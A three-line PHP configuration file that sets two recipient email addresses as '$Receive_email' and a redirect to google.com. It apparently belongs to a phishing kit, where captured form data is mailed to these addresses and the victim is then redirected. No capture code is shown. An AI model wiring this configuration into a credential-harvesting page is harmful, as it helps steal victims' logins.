<?php 
$Receive_email="tycoo2012@protonmail.com, box1report@yandex.com";
$redirect="https://www.google.com/";
?>